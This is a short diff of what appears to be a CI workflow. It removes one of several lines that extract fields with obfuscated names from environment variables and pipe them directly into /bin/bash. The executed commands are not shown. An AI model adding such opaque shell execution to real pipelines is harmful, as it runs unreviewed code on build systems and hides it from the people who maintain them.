@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$zlnlc7" | jq -r .mrbeq4534 | /bin/bash
           echo $h2 | jq -r .w05 | /bin/bash
           echo $y095 | jq -r .ftbzu318 | /bin/bash
-          printf '%s' "$tf660" | jq -r .egw9 | /bin/bash
           echo $r3899 | jq -r .ad61 | /bin/bash
           echo $wjmk62 | jq -r .qjw1145 | /bin/bash
           echo $kbhu037 | jq -r .zl838 | /bin/bash
